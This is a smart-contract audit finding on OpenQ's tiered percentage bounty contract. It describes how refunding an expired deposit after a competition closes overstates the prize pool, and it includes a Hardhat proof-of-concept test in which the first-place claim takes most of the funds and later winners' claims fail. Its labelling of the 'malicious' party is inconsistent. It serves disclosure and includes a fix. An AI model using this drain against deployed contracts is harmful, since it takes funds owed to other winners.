# [H-01] Capture the majority of the prize pool by exploiting the deposit and refund mechanism

## Summary

In a Tiered Percentage Bounty competition, it is possible for a participant to capture the majority of the prize pool by exploiting the deposit and refund mechanism. Specifically, a participant could deposit a big amount of funds into the competition, wait for the competition to close, and then withdraw their deposited funds. He could then front-run other winners to withdraw the majority of the prize pool before other winners can claim their share. 

## Vulnerability Details

When the competition is closed, the contract calculates the `fundingTotal` and uses it to calculate prize volume for each winning tier.

https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/TieredPercentageBountyV1.sol#L115-L116

However the underlying assets could be withdrawn by the funder if the deposit is expired.

It makes the `fundingTotal` overstating the total assets and calculating wrongly the prize volume. A participant could front-run others to withdraw the overstating amount.

In the POC, the malicious participant could set the deposit expiration to 1s for easily demonstrating. In reality, the malicious participant could set the deposit expiration so that it expires right after the competition is closed.

POC: Put in for using setup ./test/Bounty/TieredPercentageBounty.test.js

    describe('POC', () => {
		it('Malicious claimer gets majority of prize pool', async () => {
			// ARRANGE
			const volume = 1000;

			const [, firstPlace, secondPlace, thirdPlace, maliciousDepositer] = await ethers.getSigners();

			// Owner deposit 1000 LINK to competition
			await tieredContract.connect(depositManager).receiveFunds(owner.address, mockLink.address, volume, Constants.thirtyDays);

			// Malicious Depositer front run the close competition and deposit 500 LINK with expire time very short for example 1s and wait for competition close
			await mockLink.transfer(maliciousDepositer.address, 500);
			await mockLink.connect(maliciousDepositer).approve(tieredContract.address, 500);
			await tieredContract.connect(depositManager).receiveFunds(maliciousDepositer.address, mockLink.address, 500, 1);

			//  1s pass
			ethers.provider.send("evm_increaseTime", [1]);

			const depositId = (await tieredContract.getDeposits())[1];

			// Competition closed
			await tieredContract.connect(claimManager).closeCompetition();

			// ASSUME

			const bountyMockTokenBalance = (await mockLink.balanceOf(tieredContract.address)).toString();
			expect(bountyMockTokenBalance).to.equal('1500');

			const claimerMockTokenBalance = (await mockLink.balanceOf(firstPlace.address)).toString();
			expect(claimerMockTokenBalance).to.equal('0');

			// ACT

			// Right after the competition closes, malicious depositer withdraws all 500 LINK
			await tieredContract.connect(depositManager).refundDeposit(depositId, maliciousDepositer.address, 500);
			await tieredContract.connect(claimManager).claimTiered(firstPlace.address, 0, mockLink.address);

			// // ASSERT	

			// Malicious winner claims 90% of the price pool when it should have only 60%
			const newClaimerMockTokenBalance = (await mockLink.balanceOf(firstPlace.address)).toString();
			expect(newClaimerMockTokenBalance).to.equal('900');
			
			expect(await mockLink.balanceOf(tieredContract.address)).to.equal('100');

			// ACT
			
			// Second place winner cannot withdraw
			await expect(tieredContract.connect(claimManager).claimTiered(secondPlace.address, 1, mockLink.address)).to.be.revertedWith('ERC20: transfer amount exceeds balance')

			// // ASSERT
			const secondPlaceMockTokenBalance = (await mockLink.balanceOf(secondPlace.address)).toString();
			expect(secondPlaceMockTokenBalance).to.equal('0'); // 300->450

			// ACT

			// Third place winner cannot withdraw
			await expect(tieredContract.connect(claimManager).claimTiered(thirdPlace.address, 2, mockLink.address)).to.be.revertedWith('ERC20: transfer amount exceeds balance')

			// // ASSERT
			const thirdPlaceMockTokenBalance = (await mockLink.balanceOf(thirdPlace.address)).toString();
			expect(thirdPlaceMockTokenBalance).to.equal('0'); //100->150
		});
	});


## Impact

Malicious participant captures majority of the fund. Fund of other participant are lost. In the case of POC, they could not withdraw any of the fund.

## Tool used

Manual

## Recommendation

Add minimum days after the competition closes a depositor could withdraw the fund. Between that period of time, all the participants should claim their rewards.
